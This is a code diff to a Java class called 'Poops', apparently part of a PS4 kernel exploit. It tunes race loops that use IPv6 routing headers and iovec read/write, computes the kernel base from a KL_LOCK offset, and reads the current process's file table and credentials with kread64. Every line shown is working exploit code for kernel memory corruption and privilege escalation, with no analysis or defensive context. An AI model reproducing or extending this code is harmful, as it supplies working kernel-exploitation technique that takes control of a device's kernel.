@@ -91,6 +91,7 @@ public class Poops {
     private static int previousCore = -1;
     private static PrintStream console;
     private static API api;
+    private static long kBase;
 
     // ====================== STABILITY HELPERS ======================
     private static void adaptiveYield(int count) {
@@ -234,9 +235,9 @@ public class Poops {
             getRthdr(ipv6Socks[triplets[0]], leakRthdr, leakRthdrLen);
             if (leakRthdr.getInt(0x20) == UIO_SYSSPACE) break;
 
-            write(iovSs1, tmp, Int8.SIZE);
+            write(iovSs1, tmp, 1);
             iovState.waitForFinished();
-            read(iovSs0, tmp, Int8.SIZE);
+            read(iovSs0, tmp, 1);
         }
         if (count >= 15000) return null;
 
@@ -301,9 +302,9 @@ public class Poops {
             getRthdr(ipv6Socks[triplets[0]], leakRthdr, leakRthdrLen);
             if (leakRthdr.getInt(0x20) == UIO_SYSSPACE) break;
 
-            write(iovSs1, tmp, Int8.SIZE);
+            write(iovSs1, tmp, 1);
             iovState.waitForFinished();
-            read(iovSs0, tmp, Int8.SIZE);
+            read(iovSs0, tmp, 1);
         }
         if (count >= 15000) return false;
 
@@ -479,7 +480,7 @@ public class Poops {
         close(pipeFd.get(1));
         close(pipeFd.get(0));
 
-        long kBase = kl_lock - KernelOffset.getPS4Offset("KL_LOCK"); // sesuaikan jika perlu
+        kBase = kl_lock - KernelOffset.getPS4Offset("KL_LOCK");
 
         long procFd = kread64(curproc + KernelOffset.PROC_FD);
         long ucred = kread64(curproc + 0x40);
@@ -579,9 +580,9 @@ public class Poops {
             for (int i = 0; i < 25; i++) {
                 iovState.signalWork(0);
                 adaptiveYield(YIELD_HIGH);
-                write(iovSs1, tmp, Int8.SIZE);
+                write(iovSs1, tmp, 1);
                 iovState.waitForFinished();
-                read(iovSs0, tmp, Int8.SIZE);
+                read(iovSs0, tmp, 1);
                 adaptiveYield(YIELD_HIGH);
             }
 
@@ -601,9 +602,9 @@ public class Poops {
                 getRthdr(ipv6Socks[twins[0]], leakRthdr, leakRthdrLen);
                 if (leakRthdr.getInt(0x00) == 1) break;
 
-                write(iovSs1, tmp, Int8.SIZE);
+                write(iovSs1, tmp, 1);
                 iovState.waitForFinished();
-                read(iovSs0, tmp, Int8.SIZE);
+                read(iovSs0, tmp, 1);
             }
             if (timeout <= 0) return false;
 
